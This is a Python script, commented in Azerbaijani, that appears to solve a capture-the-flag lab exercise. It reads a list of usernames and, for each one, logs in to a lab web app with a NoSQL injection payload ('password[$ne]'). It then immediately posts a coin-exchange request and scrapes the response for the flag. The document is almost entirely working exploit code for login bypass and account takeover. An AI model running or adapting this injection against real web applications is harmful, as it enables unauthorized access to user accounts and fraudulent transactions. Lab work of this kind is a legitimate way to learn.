import requests
import sys
import re

# Hədəf URL
URL = "http://web0x01.hbtn/a3/nosql_injection"

def exploit(wordlist_file):
    print(f"[*] Wordlist faylı oxunur: {wordlist_file}")
    
    try:
        with open(wordlist_file, 'r') as f:
            usernames = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"[!] Xəta: '{wordlist_file}' faylı tapılmadı.")
        return

    print(f"[*] {len(usernames)} istifadəçi adı yoxlanacaq...")
    
    # Sessiyanı başladırıq
    s = requests.Session()
    # Brauzer kimi görünmək üçün header
    s.headers.update({'User-Agent': 'Mozilla/5.0'})

    for user in usernames:
        sys.stdout.write(f"\r[*] Yoxlanılır: {user:<20}")
        sys.stdout.flush()
        
        # 1. Login Bypass Cəhdi
        # Şifrə yerinə NoSQL injection göndəririk: "boş olmayan hər şey"
        login_payload = {
            "username": user,
            "password[$ne]": ""
        }
        
        try:
            # Login sorğusu
            r_login = s.post(URL, data=login_payload, allow_redirects=True)
            
            # 2. Exchange (Mübadilə) Cəhdi
            # Əgər istifadəçi mövcuddursa və daxil olduqsa, dərhal pul dəyişməyə çalışırıq.
            # Balansı yoxlamağa vaxt itirmirik, birbaşa cəhd edirik.
            exchange_payload = {
                "coin": "HBTNc",
                "amount": "1"
            }
            
            r_exchange = s.post(URL, data=exchange_payload)
            
            # 3. Flag Yoxlanışı
            if "Flag" in r_exchange.text or "flag" in r_exchange.text:
                print(f"\n\n[SUCCESS] UĞURLU! '{user}' istifadəçisi ilə Flag tapıldı!")
                
                # Flag-i təmizləyib çıxaraq
                flag_match = re.search(r'(Flag: .+)', r_exchange.text) or re.search(r'([a-f0-9]{32})', r_exchange.text)
                
                if flag_match:
                    flag_text = flag_match.group(0)
                    print(f"\n{flag_text}")
                    
                    # Fayla yazmaq
                    with open("7-flag.txt", "w") as flag_file:
                        flag_file.write(flag_text)
                    print("[+] Flag '7-flag.txt' faylına yazıldı.")
                else:
                    print("[!] Flag mətni tam tapılmadı, amma səhifədə var. Cavabı yoxlayın.")
                    print(r_exchange.text[:300]) # İlk 300 simvolu göstər
                
                return True # Proqramı dayandır
                
        except requests.exceptions.RequestException as e:
            print(f"\n[!] Bağlantı xətası: {e}")
            continue

    print("\n[-] Siyahı bitdi. Təəssüf ki, Flag tapılmadı.")

if __name__ == "__main__":
    # Arqument yoxlanışı
    if len(sys.argv) < 2:
        print("İstifadə qaydası:")
        print("  python3 exploit_wordlist.py <wordlist_fayli>")
        print("\nNümunə:")
        print("  python3 exploit_wordlist.py users.txt")
    else:
        exploit(sys.argv[1])
